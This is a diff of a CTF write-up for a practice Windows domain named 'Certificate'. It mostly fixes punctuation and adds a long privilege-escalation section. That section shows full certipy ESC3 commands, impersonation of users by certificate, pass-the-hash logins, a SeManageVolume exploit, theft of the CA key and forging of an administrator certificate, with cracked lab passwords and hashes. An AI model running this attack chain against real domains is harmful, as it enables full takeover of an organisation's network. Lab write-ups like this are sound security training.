@@ -236,7 +236,7 @@ try {
 ```
 
 <p class="indent-paragraph">
-With an active reverse shell, we leveraged our knowledge of the XAMPP directory structure to interact directly with the MySQL service. By executing the MySQL binary located at <code>C:\xampp\mysql\bin\mysql.exe</code>, we successfully authenticated using the extracted credentials and listed the available databases. This confirmed access to <code>certificate_webapp_db</code><span class="codefix">.</span>
+With an active reverse shell, we leveraged our knowledge of the XAMPP directory structure to interact directly with the MySQL service. By executing the MySQL binary located at <code>C:\xampp\mysql\bin\mysql.exe</code><span class="codefix">,</span> we successfully authenticated using the extracted credentials and listed the available databases. This confirmed access to <code>certificate_webapp_db</code><span class="codefix">.</span>
 </p>
 
 ```
@@ -249,7 +249,7 @@ test
 ```
 
 <p class="indent-paragraph">
-Continuing the enumeration, we queried the <code>certificate_webapp_db</code> and identified four tables of interest, particularly <code>users</code>, which revealed a list of registered accounts along with their bcrypt-hashed passwords. Among the entries, we found <code>sara.b</code>, the only user assigned the <code>admin</code> role, indicating her elevated privileges within the application. This discovery highlights a valuable authentication target for lateral movement or privilege escalation.
+Continuing the enumeration, we queried the <code>certificate_webapp_db</code> and identified four tables of interest, particularly <code>users</code><span class="codefix">,</span> which revealed a list of registered accounts along with their bcrypt-hashed passwords. Among the entries, we found <code>sara.b</code><span class="codefix">,</span> the only user assigned the <code>admin</code> role, indicating her elevated privileges within the application. This discovery highlights a valuable authentication target for lateral movement or privilege escalation.
 </p>
 
 ```
@@ -313,7 +313,7 @@ Session completed.
 ### 🧠 Enumerating SMB with Valid Credentials
 
 <p class="indent-paragraph">
-With the administrator credentials retrieved from the web application's database, we transitioned to internal enumeration. Using the username <code>sara.b</code> and the recovered password <code>Blink182</code>, we performed SMB authentication against the domain controller. The credentials were successfully validated, confirming that the compromised user is part of the internal domain <code>certificate.htb</code><span class="codefix">.</span>
+With the administrator credentials retrieved from the web application's database, we transitioned to internal enumeration. Using the username <code>sara.b</code> and the recovered password <code>Blink182</code><span class="codefix">,</span> we performed SMB authentication against the domain controller. The credentials were successfully validated, confirming that the compromised user is part of the internal domain <code>certificate.htb</code><span class="codefix">.</span>
 </p>
 
 ```
@@ -323,7 +323,7 @@ SMB         <IP>     445    DC01             [+] certificate.htb\sara.b:Blink182
 ```
 
 <p class="indent-paragraph">
-With valid domain credentials for <code>sara.b</code>, we proceeded to enumerate available SMB shares on the <code>DC01</code> host using <code>nxc</code><span class="codefix">.</span> The account successfully authenticated and revealed accessible shares such as <code>NETLOGON</code>, <code>SYSVOL</code>, and <code>IPC$</code>, all with read permissions. Although no writeable shares were identified at this stage, this level of access is often sufficient to proceed with further enumeration or identify exploitable misconfigurations in Active Directory environments.
+With valid domain credentials for <code>sara.b</code><span class="codefix">,</span> we proceeded to enumerate available SMB shares on the <code>DC01</code> host using <code>nxc</code><span class="codefix">.</span> The account successfully authenticated and revealed accessible shares such as <code>NETLOGON</code><span class="codefix">,</span> <code>SYSVOL</code><span class="codefix">,</span> and <code>IPC$</code><span class="codefix">,</span> all with read permissions. Although no writeable shares were identified at this stage, this level of access is often sufficient to proceed with further enumeration or identify exploitable misconfigurations in Active Directory environments.
 </p>
 
 ```
@@ -565,7 +565,7 @@ To further validate and visualize the structure of the packet, the corresponding
 </div>
 
 <p class="indent-paragraph">
-Following the network traffic analysis, an AS-REQ message from the user <code>Lion.SK</code> was identified using <code>tshark</code>, with the encryption type <code>etype 18</code> (AES256-CTS-HMAC-SHA1-96) and containing a cipher blob indicative of pre-authentication data exposure. This condition made the user a viable target for an <strong>AS-REP Roasting</strong> attack, which exploits the absence of enforced pre-authentication on Kerberos accounts. The extracted hash was formatted for cracking and successfully processed using <code>hashcat</code> with mode <code>19900</code><span class="codefix">,</span> revealing the user’s plaintext password as <code>!QAZ2wsx</code><span class="codefix">.</span>
+Following the network traffic analysis, an AS-REQ message from the user <code>Lion.SK</code> was identified using <code>tshark</code><span class="codefix">,</span> with the encryption type <code>etype 18</code> (AES256-CTS-HMAC-SHA1-96) and containing a cipher blob indicative of pre-authentication data exposure. This condition made the user a viable target for an <strong>AS-REP Roasting</strong> attack, which exploits the absence of enforced pre-authentication on Kerberos accounts. The extracted hash was formatted for cracking and successfully processed using <code>hashcat</code> with mode <code>19900</code><span class="codefix">,</span> revealing the user’s plaintext password as <code>!QAZ2wsx</code><span class="codefix">.</span>
 </p>
 
 ```
@@ -586,7 +586,7 @@ $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a437
 ```
 
 <p class="indent-paragraph">
-With the password <code>!QAZ2wsx</code> obtained from a successful AS-REP Roasting attack, access to the target machine was established via <code>evil-winrm</code> using the credentials <code>Lion.SK</code>. Upon authentication, the session opened a remote PowerShell shell, confirming valid user access. Navigating through the user's profile, the <code>user.txt</code> file was located on the Desktop directory and successfully retrieved, revealing the first flag.
+With the password <code>!QAZ2wsx</code> obtained from a successful AS-REP Roasting attack, access to the target machine was established via <code>evil-winrm</code> using the credentials <code>Lion.SK</code><span class="codefix">.</span> Upon authentication, the session opened a remote PowerShell shell, confirming valid user access. Navigating through the user's profile, the <code>user.txt</code> file was located on the Desktop directory and successfully retrieved, revealing the first flag.
 </p>
 
 ```
@@ -608,3 +608,465 @@ Mode                LastWriteTime         Length Name
 ~$ *Evil-WinRM* PS C:\Users\Lion.SK\Desktop> cat *
 *********************************
 ```
+
+### 🔑 Enumerating Certificate Paths
+
+<p class="indent-paragraph">
+An enumeration with <code>certipy-ad</code> targeting certificate templates revealed that the environment is vulnerable to the ESC3 attack path. The analysis identified the <code>Delegated-CRA</code> template as enabled and configured with the <code>Certificate Request Agent</code> EKU, which allows its enrollment by members of the <code>Domain CRA Managers</code> group<span class="codefix">.</span> This configuration permits delegated certificate requests on behalf of other users without requiring additional approvals, which can be exploited to impersonate privileged users within the domain.
+</p>
+
+```
+~$ certipy-ad find -u Lion.SK -p '!QAZ2wsx' -dc-ip <IP> -vulnerable
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 35 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 18 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
+[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Saving text output to '20250725013657_Certipy.txt'
+[*] Wrote text output to '20250725013657_Certipy.txt'
+[*] Saving JSON output to '20250725013657_Certipy.json'
+[*] Wrote JSON output to '20250725013657_Certipy.json'
+```
+
+<p class="indent-paragraph">
+An enumeration using <code>Certipy</code> revealed that the certificate template <code>Delegated-CRA</code> is misconfigured with the <code>Certificate Request Agent</code> EKU enabled. This configuration exposes the domain to the ESC3 attack path, allowing eligible users—such as those in the <code>Domain CRA Managers</code> group—to request certificates on behalf of other users. The template does not require manager approval, and it issues exportable private keys, which makes it highly exploitable for privilege escalation within the domain.
+</p>
+
+```
+~$ cat 20250725013657_Certipy.txt                                         
+Certificate Templates
+  0
+    Template Name                       : Delegated-CRA
+    Display Name                        : Delegated-CRA
+    Enabled                             : True
+    Extended Key Usage                  : Certificate Request Agent
+    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
+    [!] Vulnerabilities
+      ESC3                              : Template has Certificate Request Agent EKU set.
+```
+
+<p class="indent-paragraph">
+To map privilege relationships and identify potential abuse paths within the Active Directory environment, <code>bloodhound-python</code> was executed using valid credentials for the user <code>Lion.SK</code><span class="codefix">.</span> The tool successfully obtained a Kerberos TGT and connected to the domain controller <code>dc01.certificate.htb</code> via LDAP. It enumerated 3 computers, 19 users, 58 groups, 2 Group Policy Objects (GPOs), and 19 containers<span class="codefix">.</span> Despite a minor timeout during SID resolution, the data was ingested into BloodHound, setting the stage for a deeper analysis of certificate template permissions—particularly focusing on abuse vectors involving enrollment and delegation rights<span class="codefix">.</span>
+</p>
+
+```
+~$ bloodhound-python -u 'Lion.SK' -p '!QAZ2wsx' -d certificate.htb -dc dc01.certificate.htb -c All -ns <IP>
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: certificate.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.certificate.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 3 computers
+INFO: Connecting to LDAP server: dc01.certificate.htb
+INFO: Found 19 users
+INFO: Found 58 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: WS-05.certificate.htb
+INFO: Querying computer: WS-01.certificate.htb
+INFO: Querying computer: DC01.certificate.htb
+WARNING: Connection timed out while resolving sids
+INFO: Done in 00M 27S
+```
+
+<p class="indent-paragraph">
+The following graph extracted from BloodHound highlights the group membership structure for <code>LION.SK@CERTIFICATE.HTB</code><span class="codefix">.</span> As shown, this user is part of the <code>DOMAIN CRA MANAGERS</code> group, which includes other accounts such as <code>EVA.F</code> and <code>ALEX.D</code><span class="codefix">.</span> This group holds elevated permissions over the <code>Delegated-CRA</code> certificate template, enabling its members to act as enrollment agents and potentially request certificates on behalf of other users — a critical factor in the ESC3 vulnerability path.
+</p>
+
+<div style="margin-top: 20px;">
+  <img src="/img/redteam/htb/certificate/bloodhound-lion.png" alt="BloodHound-Lion" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
+</div>
+
+### 🎭 Privilege Escalation via ESC3 Vulnerability and Certificate Impersonation
+
+<p class="indent-paragraph">
+Analysis in BloodHound revealed that <code>Ryan.K@CERTIFICATE.HTB</code> is a member of the <code>Domain Storage Managers</code> group, whose members are responsible for critical volume-level tasks such as maintaining, defragmenting, and managing partitions and disks. This strategic role within the infrastructure implies elevated privileges and operational trust, making Ryan an ideal target for certificate-based impersonation attacks.
+</p>
+
+<div style="margin-top: 20px;">
+  <img src="/img/redteam/htb/certificate/bloodhound-ryan.png" alt="BloodHound-ryan" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
+</div>
+
+<p class="indent-paragraph">
+To exploit the ESC3 vulnerability within Active Directory Certificate Services (ADCS), a certificate was requested using the <code>Delegated-CRA</code> template, which includes the <code>Certificate Request Agent</code> EKU<span class="codefix">.</span> This template allows the requester to impersonate other users by generating valid certificates on their behalf<span class="codefix">.</span> The <code>certipy</code> tool was used with Lion.SK’s credentials to successfully obtain a certificate from the <code>Certificate-LTD-CA</code> authority<span class="codefix">.</span> The result was a valid <code>.pfx</code> file, containing a certificate and private key for the user <code>Lion.SK</code><span class="codefix">,</span> which can now be leveraged in further attacks such as forging TGTs or impersonating privileged accounts<span class="codefix">.</span>
+</p>
+
+```
+~$ certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip '<IP>' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 38
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Lion.SK@certificate.htb'
+[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
+[*] Saving certificate and private key to 'lion.sk.pfx'
+[*] Wrote certificate and private key to 'lion.sk.pfx'
+```
+
+<p class="indent-paragraph">
+Leveraging the previously obtained <code>lion.sk.pfx</code> certificate, a second request was issued using the <code>SignedUser</code> template and the <code>on-behalf-of</code> flag targeting the user <code>ryan.k</code><span class="codefix">.</span> This impersonation request was possible due to the <code>Certificate Request Agent</code> EKU present in the vulnerable <code>Delegated-CRA</code> template<span class="codefix">.</span> The command generated a new certificate and private key for <code>ryan.k</code> without requiring that user’s credentials<span class="codefix">.</span> The resulting <code>ryan.k.pfx</code> file enables authentication as <code>ryan.k</code><span class="codefix">,</span> paving the way for lateral movement or privilege escalation depending on the target account’s rights and group memberships<span class="codefix">.</span>
+</p>
+
+```
+~$ certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip '<IP>' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 39
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'ryan.k@certificate.htb'
+[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
+[*] Saving certificate and private key to 'ryan.k.pfx'
+[*] Wrote certificate and private key to 'ryan.k.pfx'
+```
+
+<p class="indent-paragraph">
+With the impersonated certificate in hand, the next step involved authenticating as <code>ryan.k</code> using <code>certipy-ad auth</code> and the <code>ryan.k.pfx</code> file<span class="codefix">.</span> This process successfully generated a Kerberos TGT and stored it as a credential cache file (<code>ryan.k.ccache</code>)<span class="codefix">.</span> Additionally, Certipy extracted the NTLM hash for the impersonated user, which can be reused in pass-the-hash attacks or other post-exploitation scenarios<span class="codefix">.</span> This confirmed full impersonation and control over the account <code>ryan.k@certificate.htb</code><span class="codefix">,</span> completing a crucial step in the privilege escalation chain via ESC3 abuse<span class="codefix">.</span>
+</p>
+
+```
+~$ certipy-ad auth -pfx 'ryan.k.pfx' -dc-ip '<IP>'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'ryan.k@certificate.htb'
+[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
+[*] Using principal: 'ryan.k@certificate.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ryan.k.ccache'
+[*] Wrote credential cache to 'ryan.k.ccache'
+[*] Trying to retrieve NT hash for 'ryan.k'
+[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
+```
+
+<p class="indent-paragraph">
+To assess the effective permissions and security context of the compromised user <code>ryan.k</code><span class="codefix">,</span> the command <code>whoami /all</code> was executed via <code>evil-winrm</code><span class="codefix">.</span> The output confirmed that the account is a member of several local and domain-level groups, including the <code>Domain Storage Managers</code><span class="codefix">,</span> a group often associated with elevated storage management capabilities<span class="codefix">.</span> More importantly, the privileges section revealed the presence and active state of <code>SeManageVolumePrivilege</code><span class="codefix">,</span> which allows a user to perform volume-level maintenance tasks<span class="codefix">.</span> This privilege, combined with the group memberships, indicates a potential vector for privilege escalation through abuse of volume operations or storage-related attack paths<span class="codefix">.</span>
+</p>
+
+```
+~$ evil-winrm -i DC01.certificate.htb -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6                   
+                                        
+Evil-WinRM shell v3.7
+
+*Evil-WinRM* PS C:\Users\Ryan.K> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name          SID
+================== =============================================
+certificate\ryan.k S-1-5-21-515537669-4223687196-3249690583-1117
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+CERTIFICATE\Domain Storage Managers        Group            S-1-5-21-515537669-4223687196-3249690583-1118 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                      State
+============================= ================================ =======
+SeMachineAccountPrivilege     Add workstations to domain       Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
+~$ SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+<p class="indent-paragraph">
+Following the privilege assessment, the command <code>certutil -store My</code> was executed to enumerate the certificates stored in the current user's personal store. Among the listed entries, the presence of certificates issued by both the <code>Certificate-LTD-CA</code> and <code>certificate-DC01-CA</code> authorities was confirmed. Notably, one of the certificates references the <code>DomainController</code> template, which is commonly used for domain controller authentication and could imply elevated trust if misused<span class="codefix">.</span> Although the stored keysets were missing, the existence of such certificates reveals valuable insight into the domain’s certificate infrastructure and its integration with the compromised user’s context.
+</p>
+
+```
+~$ *Evil-WinRM* PS C:\Users\Ryan.K> certutil -Store My
+My "Personal"
+================ Certificate 0 ================
+Archived!
+Serial Number: 472cb6148184a9894f6d4d2587b1b165
+Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 3:30 PM
+ NotAfter: 11/3/2029 3:40 PM
+Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
+CA Version: V0.0
+Signature matches Public Key
+Root Certificate: Subject matches Issuer
+Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
+  Key Container = certificate-DC01-CA
+  Provider = Microsoft Software Key Storage Provider
+Missing stored keyset
+
+================ Certificate 1 ================
+Serial Number: 5800000002ca70ea4e42f218a6000000000002
+Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 8:14 PM
+ NotAfter: 11/3/2025 8:14 PM
+Subject: CN=DC01.certificate.htb
+Certificate Template Name (Certificate Type): DomainController
+Non-root Certificate
+Template: DomainController, Domain Controller
+Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
+  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft RSA SChannel Cryptographic Provider
+Missing stored keyset
+
+================ Certificate 2 ================
+~$ Serial Number: 75b2f4bbf31f108945147b466131bdca
+Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 3:55 PM
+ NotAfter: 11/3/2034 4:05 PM
+Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+Certificate Template Name (Certificate Type): CA
+CA Version: V0.0
+Signature matches Public Key
+Root Certificate: Subject matches Issuer
+Template: CA, Root Certification Authority
+Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
+  Key Container = Certificate-LTD-CA
+  Provider = Microsoft Software Key Storage Provider
+Missing stored keyset
+CertUtil: -store command completed successfully.
+```
+
+<p class="indent-paragraph">
+Following the discovery that the user <code>Ryan.K</code> possessed the <code>SeManageVolumePrivilege</code> right, a lesser-known but effective privilege escalation technique was identified. This specific privilege allows a user to perform maintenance tasks on system volumes, which can be exploited to create arbitrary files on disk with <code>SYSTEM-level</code> ownership. To weaponize this capability, the open-source tool <a href="https://github.com/CsEnox/SeManageVolumeExploit" target="_blank">SeManageVolumeExploit</a> by <code>CsEnox</code> was selected.
+</p>
+
+```
+~$ curl -LO https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100 12288  100 12288    0     0  37493      0 --:--:-- --:--:-- --:--:-- 37493
+                                                                                                                                                                                                                          
+~$ file SeManageVolumeExploit.exe                                                                                                     
+SeManageVolumeExploit.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 6 sections
+```
+
+<p class="indent-paragraph">
+To exploit the <code>SeManageVolumePrivilege</code><span class="codefix">,</span> the binary <code>SeManageVolumeExploit.exe</code> was uploaded and executed with the target path <code>C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</code><span class="codefix">.</span> This path stores certificate private keys, and the exploit creates fake key containers matching existing certificates. As a result, Windows stopped reporting "Missing stored keyset", allowing the private key to be accessed and the certificate to be exported successfully.
+</p>
+
+```
+~$ *Evil-WinRM* PS C:\Users\Ryan.K> upload SeManageVolumeExploit.exe
+                                        
+Info: Uploading /home/kali/ctf-player/certificate/SeManageVolumeExploit.exe to C:\Users\Ryan.K\SeManageVolumeExploit.exe
+                                        
+Data: 16384 bytes of 16384 bytes copied
+                                        
+Info: Upload successful!
+
+~$ *Evil-WinRM* PS C:\Users\Ryan.K> .\SeManageVolumeExploit.exe C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys
+Entries changed: 844
+
+DONE
+```
+
+<p class="indent-paragraph">
+During privilege escalation, it was confirmed that the directory <code>C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</code> granted write access to <code>Everyone</code> and full control to <code>Users</code><span class="codefix">.</span> This permissive configuration enabled the injection of a fake key container by the exploit. The focus was placed on <strong>Certificate 2</strong>, a root CA with high trust and exportable potential. After running <code>certutil -store My</code><span class="codefix">,</span> the output showed <code>Signature test passed</code><span class="codefix">,</span> confirming that the private key was now accessible.
+</p>
+
+
+
+```
+~$ *Evil-WinRM* PS C:\Users\Ryan.K> icacls "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"
+C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys Everyone:(R,W)
+                                                BUILTIN\Users:(F)
+
+Successfully processed 1 files; Failed processing 0 files
+
+~$ *Evil-WinRM* PS C:\Users\Ryan.K> certutil -Store My
+My "Personal"
+================ Certificate 0 ================
+Archived!
+Serial Number: 472cb6148184a9894f6d4d2587b1b165
+Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 3:30 PM
+ NotAfter: 11/3/2029 3:40 PM
+Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
+CA Version: V0.0
+Signature matches Public Key
+Root Certificate: Subject matches Issuer
+Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
+  Key Container = certificate-DC01-CA
+  Unique container name: 6f761f351ca79dc7b0ee6f07b40ae906_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
+Signature test passed
+
+================ Certificate 1 ================
+Serial Number: 5800000002ca70ea4e42f218a6000000000002
+Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 8:14 PM
+ NotAfter: 11/3/2025 8:14 PM
+Subject: CN=DC01.certificate.htb
+Certificate Template Name (Certificate Type): DomainController
+Non-root Certificate
+Template: DomainController, Domain Controller
+Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
+  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Simple container name: te-DomainController-3ece1f1c-d299-4a4d-be95-efa688b7fee2
+  Provider = Microsoft RSA SChannel Cryptographic Provider
+Private key is NOT exportable
+Encryption test passed
+
+================ Certificate 2 ================
+~$ Serial Number: 75b2f4bbf31f108945147b466131bdca
+Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 3:55 PM
+ NotAfter: 11/3/2034 4:05 PM
+Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+Certificate Template Name (Certificate Type): CA
+CA Version: V0.0
+Signature matches Public Key
+Root Certificate: Subject matches Issuer
+Template: CA, Root Certification Authority
+Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
+  Key Container = Certificate-LTD-CA
+  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
+~$ Signature test passed
+CertUtil: -store command completed successfully.
+```
+
+<p class="indent-paragraph">
+With the private key now accessible, the attacker executed <code>certutil -exportPFX</code> targeting the certificate with serial number <code>75b2f4bbf31f108945147b466131bdca</code><span class="codefix">.</span> The command successfully exported the root CA certificate <code>Certificate-LTD-CA</code> along with its private key, as indicated by the <code>Signature test passed</code> message and the final confirmation. This validated that the previous privilege escalation steps had effectively restored the keyset, enabling full certificate extraction.
+</p>
+
+
+```
+~$ *Evil-WinRM* PS C:\Users\Ryan.K> certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca Certificate-LTD-CA.pfx
+My "Personal"
+================ Certificate 2 ================
+~$ Serial Number: 75b2f4bbf31f108945147b466131bdca
+Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 3:55 PM
+ NotAfter: 11/3/2034 4:05 PM
+Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+Certificate Template Name (Certificate Type): CA
+CA Version: V0.0
+Signature matches Public Key
+Root Certificate: Subject matches Issuer
+Template: CA, Root Certification Authority
+Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
+  Key Container = Certificate-LTD-CA
+  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
+Signature test passed
+Enter new password for output file Certificate-LTD-CA.pfx:
+Enter new password:
+Confirm new password:
+~$ CertUtil: -exportPFX command completed successfully.
+```
+
+<p class="indent-paragraph">
+After successfully exporting the <code>Certificate-LTD-CA.pfx</code> file, the attacker proceeded to download it to their local machine using the built-in <code>download</code> functionality in Evil-WinRM. The file transfer completed without errors, making the root CA certificate and its private key available for offline use in subsequent attacks.
+</p>
+
+```
+~$ *Evil-WinRM* PS C:\Users\Ryan.K> download Certificate-LTD-CA.pfx
+                                        
+Info: Downloading C:\Users\Ryan.K\Certificate-LTD-CA.pfx to Certificate-LTD-CA.pfx
+                                        
+Info: Download successful!
+```
+
+<p class="indent-paragraph">
+Upon attempting authentication with <code>certipy-ad auth</code> using the downloaded PFX, an error was returned indicating a name mismatch and the absence of a valid identity in the certificate. This happened because the original root CA certificate does not contain a Subject Alternative Name (SAN) or User Principal Name (UPN) matching the target user <code>Administrator@certificate.htb</code><span class="codefix">.</span> To bypass this limitation, the attacker used Certipy’s <code>forge</code> command to generate a fake certificate signed by the trusted CA, embedding the desired UPN. This resulted in a forged certificate <code>forged_admin.pfx</code><span class="codefix">,</span> which could now be used for successful impersonation.
+</p>
+
+```
+~$ certipy-ad auth -pfx Certificate-LTD-CA.pfx -dc-ip <IP> -user Administrator -domain certificate.htb
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[!] Could not find identity in the provided certificate
+[*] Using principal: 'administrator@certificate.htb'
+[*] Trying to get TGT...
+[-] Name mismatch between certificate and user 'administrator'
+[-] See the wiki for more information
+                                                                                                                                                                         
+~$ certipy-ad forge -ca-pfx Certificate-LTD-CA.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx 
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Saving forged certificate and private key to 'forged_admin.pfx'
+[*] Wrote forged certificate and private key to 'forged_admin.pfx'
+```
+
+<p class="indent-paragraph">
+Before attempting authentication with the forged certificate, the attacker ensured the local system time was synchronized with the Domain Controller using <code>ntpdate</code><span class="codefix">.</span> This step is critical, as Kerberos relies on tight time alignment to validate TGTs; significant drift would cause ticket requests to fail. Once the time was aligned, the attacker authenticated as <code>administrator@certificate.htb</code> using the forged certificate via <code>certipy-ad auth</code><span class="codefix">.</span> The operation succeeded, resulting in a valid TGT and the extraction of the NTLM hash for the domain Administrator account, completing the privilege escalation chain.
+</p>
+
+```
+~$ certipy-ad auth -dc-ip '<IP>' -pfx 'forged_admin.pfx' -username 'administrator' -domain 'certificate.htb'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@certificate.htb'
+[*] Using principal: 'administrator@certificate.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+~$ [*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
+```
+
+<p class="indent-paragraph">
+With the forged administrator certificate and corresponding NT hash in hand, the attacker established a remote session using <code>Evil-WinRM</code> and successfully authenticated as <code>Administrator</code> on the Domain Controller. Navigating to the Administrator’s desktop, the attacker accessed the <code>root.txt</code> flag, confirming full domain compromise and the successful completion of the privilege escalation lab.
+</p>
+
+```
+~$ evil-winrm -i DC01.certificate.htb -u administrator -H d804304519bf0143c14cbf1c024408c6 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Info: Establishing connection to remote endpoint
